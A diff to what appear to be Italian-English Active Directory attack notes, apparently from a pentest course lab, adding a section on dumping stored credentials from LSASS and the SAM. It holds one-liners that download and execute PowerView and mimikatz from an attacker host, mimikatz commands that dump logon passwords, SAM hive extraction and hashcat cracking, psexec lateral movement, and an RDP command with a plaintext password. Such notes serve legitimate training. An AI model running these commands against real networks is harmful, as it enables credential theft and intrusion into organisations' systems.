@@ -5,8 +5,8 @@
 
 - Enumeration via PowerView
 
-- Pass the Ticket
-	- Access as a user to the domain required
+- Archiviazione e recupero credenziali memorizzate (Lateral Movement)
+	- Access as Local Admin (Need Privilege Escalation)
 
 - Kerberoasting
 	- Access as any user required
@@ -122,4 +122,23 @@
 	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Invoke-EnumerateLocalAdmin Verbose"
 	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Invoke-UserHunter"
 	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Invoke.UserHunter -Stealth"
+```
+
+## Archiviazione e recupero credenziali memorizzate (Lateral Movement)
+### Poiché l'implementazione di Kerberos da parte di Microsoft utilizza il single sign-on, gli hash delle password devono essere archiviati da qualche parte per rinnovare una richiesta TGT. Nelle versioni correnti di Windows, questi hash sono archiviati nello spazio di memoria LSASS (Local Security Authority Subsystem Service). Se otteniamo l'accesso a questi hash, potremmo craccarli per ottenere la password in chiaro o riutilizzarli per eseguire varie azioni.
+### Problemi: Sebbene questo sia l'obiettivo finale del nostro attacco AD, il processo non è così semplice come sembra. Poiché il processo LSASS fa parte del sistema operativo e viene eseguito come SYSTEM, abbiamo bisogno delle autorizzazioni SYSTEM (o amministratore locale) per ottenere l'accesso agli hash archiviati su una destinazione.Per questo motivo, per prendere di mira gli hash archiviati, spesso dobbiamo iniziare il nostro attacco con un'escalation dei privilegi locali. Per rendere le cose ancora più complicate, le strutture di dati utilizzate per archiviare gli hash in memoria non sono pubblicamente documentate e sono anche crittografate con una chiave archiviata in LSASS.
+
+- Uso reg per recupero NTLM
+```
+			- reg save HKLM\sam sam
+			- reg save NKLM\system system
+			- samdump2 system sam (NTLM lo piazzi dentro un file .txt)
+			- hashcat -m 1000 -a 3 hash.txt rockyou.txt
+```
+- Con mimikatz eseguibile (mimikatz.exe)
+```
+			- certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+			- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > hash.txt
+			- impacket-psexec username:password@IP
+			- xfreerdp /u:david /d:xor.com /p:dsfdf34534tdfGDFG5rdgr  /v:10.11.1.120
 ```
